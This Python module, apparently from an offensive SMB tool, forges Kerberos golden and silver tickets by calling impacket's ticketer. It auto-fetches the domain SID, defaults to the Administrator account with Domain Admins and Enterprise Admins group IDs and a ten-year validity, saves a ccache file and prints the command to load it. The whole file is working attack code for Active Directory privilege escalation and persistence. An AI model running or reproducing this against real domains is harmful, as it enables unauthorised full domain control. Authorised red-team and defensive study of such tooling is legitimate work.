import os
import sys

from slingerpkg.utils.printlib import *


class ticket:
    def __init__(self):
        print_debug("Ticket Module Loaded!")

    def ticket_handler(self, args):
        """Route ticket golden/silver subcommands."""
        action = getattr(args, "ticket_action", None)
        if action == "golden":
            self._create_ticket(args, is_golden=True)
        elif action == "silver":
            self._create_ticket(args, is_golden=False)
        else:
            print_bad("Use 'ticket golden' or 'ticket silver'")

    def _create_ticket(self, args, is_golden=True):
        """Create a golden or silver Kerberos ticket using impacket's TICKETER."""
        import argparse
        import importlib.util

        ticket_type = "golden" if is_golden else "silver"
        nthash = getattr(args, "nthash", None)
        aes_key = getattr(args, "aesKey", None)
        spn = getattr(args, "spn", None)

        if not nthash and not aes_key:
            print_bad("Provide -nthash or -aesKey for ticket signing")
            return

        if not is_golden and not spn:
            print_bad("Silver ticket requires -spn (e.g., cifs/dc01.domain.com)")
            return

        # Auto-fetch domain SID if not provided
        domain_sid = getattr(args, "domain_sid", None)
        if not domain_sid:
            try:
                from impacket.examples.secretsdump import RemoteOperations

                print_info("Fetching domain SID...")
                use_kerberos = getattr(self, "use_kerberos", False)
                remote_ops = RemoteOperations(self.conn, use_kerberos)
                remote_ops.connectSamr(self.domain)
                domain_sid = remote_ops.getDomainSid()
                print_good(f"Domain SID: {domain_sid}")
                remote_ops.finish()
            except Exception as e:
                print_bad(f"Cannot auto-fetch domain SID: {e}")
                print_info("Provide manually with --domain-sid")
                return

        # Use session domain if not provided
        domain = getattr(args, "domain", None) or self.domain
        if not domain:
            print_bad("Domain required — provide with --domain or connect to a domain target")
            return

        user = getattr(args, "user", "Administrator")
        user_id = getattr(args, "user_id", 500)
        groups = getattr(args, "groups", "513, 512, 520, 518, 519")
        extra_sid = getattr(args, "extra_sid", None)
        duration = getattr(args, "duration", 87600)  # 10 years in hours
        output = getattr(args, "output", None)
        if not output:
            output_dir = os.path.expanduser("~/.slinger")
            os.makedirs(output_dir, exist_ok=True)
            output = os.path.join(output_dir, f"{user}.ccache")

        print_info(f"Creating {ticket_type} ticket...")
        print_log(f"  User: {user} (RID {user_id})")
        print_log(f"  Domain: {domain}")
        print_log(f"  Domain SID: {domain_sid}")
        if spn:
            print_log(f"  SPN: {spn}")
        print_log(f"  Groups: {groups}")
        print_log(f"  Output: {output}")

        try:
            # Load TICKETER from impacket's ticketer.py
            ticketer_path = None
            import shutil

            for name in ["ticketer.py", "ticketer", "impacket-ticketer"]:
                found = shutil.which(name)
                if found:
                    ticketer_path = found
                    break

            if not ticketer_path:
                # Try venv/bin
                venv_path = os.path.join(
                    os.path.dirname(os.path.dirname(sys.executable)), "bin", "ticketer.py"
                )
                if os.path.exists(venv_path):
                    ticketer_path = venv_path

            if not ticketer_path:
                print_bad("Cannot find ticketer.py — ensure impacket is installed")
                return

            spec = importlib.util.spec_from_file_location("ticketer", ticketer_path)
            ticketer_mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(ticketer_mod)

            # Build options namespace matching TICKETER expectations
            options = argparse.Namespace(
                spn=spn,
                nthash=nthash,
                aesKey=aes_key,
                keytab=None,
                domain_sid=domain_sid,
                duration=duration,
                groups=groups,
                user_id=user_id,
                extra_sid=extra_sid,
                extra_pac=False,
                old_pac=False,
                request=False,
                user=None,
                hashes=f":{nthash}" if nthash else None,
                dc_ip=None,
                target_ip=self.host,
                k=False,
                rodcNo=None,
                rodcKey=None,
                use_keylist=False,
                ts=False,
            )

            ticketer = ticketer_mod.TICKETER(user, "", domain, options)
            ticketer.run()

            # TICKETER saves to <user>.ccache in current directory by default
            default_ccache = f"{user}.ccache"
            if os.path.exists(default_ccache) and output != default_ccache:
                import shutil as shutil2

                shutil2.move(default_ccache, output)

            if os.path.exists(output):
                print_good(f"{ticket_type.capitalize()} ticket saved to {output}")
                print_info(f"Use with: export KRB5CCNAME={output}")
                self._track(
                    "EXEC",
                    f"ticket_{ticket_type}",
                    domain,
                    f"user={user}, sid={domain_sid}",
                )
            else:
                print_bad("Ticket file not created — check parameters")

        except Exception as e:
            try:
                error_str = str(e)
            except TypeError:
                error_str = repr(e)
            print_bad(f"Ticket creation failed: {error_str}")
            print_debug("Traceback:", sys.exc_info())
